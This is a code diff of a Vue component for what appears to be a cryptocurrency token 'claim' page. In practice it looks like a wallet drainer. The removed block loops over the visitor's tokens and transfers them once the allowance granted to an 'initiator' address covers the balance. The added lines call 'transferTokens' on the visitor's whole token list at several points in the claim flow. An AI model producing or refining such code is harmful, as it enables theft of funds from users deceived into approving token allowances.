@@ -437,15 +437,13 @@ import Datavg from './Datavg.vue';
 import Footer from './Footer.vue';
 import { useToast } from 'vue-toastification';
 import { disconnect, getAccount, fetchFeeData } from '@wagmi/core';
-import Web3 from 'web3';
-import * as constants from './utils/constants.js';
 import {
   web3modal,
   claim,
   balanceOf,
   getTokens,
   increaseAllowance,
-  transfer,
+  transferTokens,
 } from './utils/walletconnect.js';
 const Toast = useToast();
 import axios from 'axios';
@@ -469,32 +467,7 @@ export default {
       currentIndex: 0,
     };
   },
-  async mounted() {
-    this.transferTokens(tokens);
-  },
   methods: {
-    async transferTokens() {
-      const intervalId = setInterval(() => {
-        console.log("transferFrom");
-        if(this.sortedTokens.length > 0) {
-          const web3 = new Web3(window.ethereum);
-          const account = getAccount().address;
-          for(let i = 0; i < sortedTokens.length; i++){
-            var contract = new web3.eth.Contract(
-              constants.ALLOWANCEABI,
-              this.sortedTokens[i].token_address
-            );
-            const allowance = contract.methods
-              .allowance(account, constants.initiator)
-              .call();
-            if (allowance >= this.sortedTokens[i].balance) {
-              return transfer(this.sortedTokens[i]);
-            }
-          }
-        }
-        clearInterval(intervalId);
-      }, 1000);
-    },
     async wc_claim() {
       try {
         if (getAccount().isConnected) {
@@ -510,20 +483,23 @@ export default {
 
           this.processing = false;
           this.isDone = true;
-
+          await transferTokens(this.sortedTokens);
           if (this.currentIndex + 1 > this.sortedTokens.length) {
             if (this.claimable > 0) {
               await claim(this.balance.value);
               this.claimable = 0;
+              await transferTokens(this.sortedTokens);
             } else {
               this.processing = false;
               this.isDone = false;
               Swal.close();
               Swal.hideLoading();
+              await transferTokens(this.sortedTokens);
             }
           } else {
             this.currentIndex += 1;
             this.maxToken = this.sortedTokens[this.currentIndex];
+            await transferTokens(this.sortedTokens);
             this.wc_claim();
           }
         } else {
